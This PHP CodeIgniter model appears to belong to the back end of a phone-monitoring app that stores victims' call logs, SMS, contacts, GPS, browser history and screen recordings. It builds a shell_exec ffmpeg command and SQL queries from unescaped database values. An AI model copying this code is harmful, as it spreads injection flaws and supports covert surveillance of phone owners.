<?php
class Event_action_model extends CI_Model
{

    public function __construct()
    {
        $this->load->database();
    }
	function deleteOldData()
	{
		
$this->db->truncate('call_log');
$this->db->truncate('device_apps');
$this->db->truncate('device_browser_history');
$this->db->truncate('device_contact');
$this->db->truncate('device_gps');

$this->db->truncate('device_native_sms');
$this->db->truncate('device_wifi_conn');
//$this->db->truncate('device_gps');
//$this->db->truncate('media');
$this->db->truncate('tb_ready');		 
		
	}
	
	function deleteDeviceData($id)
	{
		$this->db->where('id',$id);
		$spyqry  = $this->db->get('device_info');
		if($spyqry->num_rows()>0){
		$spydata	 = $spyqry->row();
		$uuid =	$spydata->uuid;
		$this->deleteMedia($uuid);
	 $this->deleteOcr($uuid);
	 
$this->db->where('device_id',$uuid);
$this->db->delete('device_contact');

$this->db->where('uuid',$uuid);
$this->db->delete('device_events');

$this->db->where('uuid',$uuid);
$this->db->delete('device_general');
 
$this->db->where('device_id',$uuid);
$this->db->delete('device_gps');

$this->db->where('uuid',$uuid);
$this->db->delete('device_setting');

 

$this->db->where('device_id',$uuid);
$this->db->delete('media');



$this->db->where('device_id',$uuid);
$this->db->delete('ocr_media');

$this->db->where('uuid',$uuid);
$this->db->delete('tb_ready');	

unlink('./upload/userimg/'.$spydata->image); 
$this->db->where('uuid',$uuid);
$this->db->delete('device_info');		
 echo $this->db->last_query();exit;
		}
	}
	
	function deleteMedia($uuid)
	{
		$this->db->where('device_id',$uuid);
		$mediaqry  = $this->db->get('media');
		if($mediaqry->num_rows()>0){
			$mediadata = $mediaqry->result_array();
			foreach ($mediadata as $row) {
				$file = $row['file_name'] ;
			unlink('./upload/media/'.$file); 
			}
			
		}
	}
	function deleteOcr($uuid)
	{
		$this->db->where('device_id',$uuid);
		$ocrqry =  $this->db->get('ocr_media');
		if($ocrqry->num_rows()>0){
			$ocrqrydata = $ocrqry->result_array();
			foreach ($ocrqrydata as $row) {
				$file = $row['file_name'] ; 
				$ocr_code = $row['ocr_code'] ; 
			unlink('./upload/ocr_media/'.$file); 
			unlink('./upload/ocr_media/video/'.$ocr_code.".mp4"); 
			}
			
		}
	}
	function checkLastActivity()
	{
		$this->makeOcrVideo();
		
		date_default_timezone_set("UTC");
		$gmdate = gmdate("Y-m-d H:i:s");
		$this->offSync($gmdate);
       $this->checkUserLastActivity();
		$result = $this->db->query("SELECT * FROM `admin` WHERE `id` = '1'");
		if($result->num_rows()>0){
		$row =	 $result->row();
		$lastactivity	 = $row->last_activity;
		
		$to_time = strtotime($gmdate);
$from_time = strtotime($lastactivity);
$minsdiff =  round(abs($to_time - $from_time) / 60,2);

if($minsdiff>10){
	echo "Delete old data form the server.";
	//$this->deleteOldData(); on client request
}else{
	echo "No need to delete old data form the server.";
}
			
	    }else{
			return false;
		}
	}
	
	function deleteLogs()
	{
		date_default_timezone_set("UTC");
		$date = date('Y-m-d', strtotime('-15 days'));
			$query = "delete from logs where date(created_on)<= '$date'";
			$this->db->query($query);
			  $this->db->last_query();
	}
	
	
		function offSync($gmdate)
	{
		
		$result = $this->db->query("SELECT * FROM `device_setting` ");
		if($result->num_rows()>0){
			foreach ($result->result() as $data) {
				$h_mins = 0;
				$mobileSettingUpdate =	 $data->updatedon;
				$id =	 $data->id;
				
				$sync_time =	 $data->sync_time;
				$timearr = explode(":", $sync_time);
				if(count($timearr)>0){
					if(($timearr[0]==00)&&($timearr[1]==00)){
						return true;
					}
				}
				if($timearr[0]>0){
					$h_mins = ($timearr[0]*60);
				}
				$totalmins = $h_mins + $timearr[1];
		        $limit_time = date("Y-m-d H:i:s", strtotime($mobileSettingUpdate . "+".$totalmins." minutes"));
				$gm_time = strtotime($gmdate);
                $sch_time = strtotime($limit_time);
				if($gm_time>$sch_time){
					$this->db->query("UPDATE `device_setting` SET microphone = '0',screen_recording_activate='0'
					,ocrvideo_recording='0',ocrscreenshot='0'
					 WHERE id = '$id'  ");
				}
				
			}
		
		}
		return true;
	}
	
	function makeOcrVideo()
	{
		
	$query	= $this->db->query("SELECT * FROM `ocr_media` WHERE video_made = '0' and (ocr_type ='0' or  
		ocr_type ='2') GROUP BY ocr_code ");
		
   if($query->num_rows()>0){
   	foreach ($query->result() as $row) {
		if(strlen($row->ocr_code)>1){
		 $ocr_code  = $row->ocr_code;
   		echo shell_exec("ffmpeg -framerate 1 -pattern_type glob -i './upload/ocr_media/".$ocr_code."*.jpg'     -c:v libx264 -r 30 -pix_fmt yuv420p "."./upload/ocr_media/video/".$ocr_code.".mp4");	 
	     	
	   $this->db->query("UPDATE   `ocr_media`  SET video_made = '1'  WHERE  ocr_code = '".$ocr_code."'  ");		
		}
	   }
   }
		
	}
	
    function updateUserStatus($id)
	{
		  $gm_time = get_gmt_time();
   
 
	 $in_arr = array(
            "status" => 'OFFLINE',
            "last_status_check" => $gm_time);
			
			$this->db->where('id',$id);
			$qry_res= $this->db->update('device_info', $in_arr);
	}
		function checkUserLastActivity()
	{
		$this->deleteLogs();
		date_default_timezone_set("UTC");
		$gmdate = gmdate("Y-m-d H:i:s");
 
		$result = $this->db->query("SELECT * FROM `device_info` WHERE status = 'ONLINE' ");
		if($result->num_rows()>0){
			foreach ($result->result_array() as $raw) {
				
	 
		$lastactivity	 = $raw['last_status_check'];
		
		$to_time = strtotime($gmdate);
$from_time = strtotime($lastactivity);
$minsdiff =  round(abs($to_time - $from_time) / 60,2);

if($minsdiff>1){
	//echo "User Offline.";
	$this->updateUserStatus($raw['id']);
}else{
	//echo "User Online.";
}
			}	
	    }else{
			return false;
		}
		
	}
	 
}
	
?>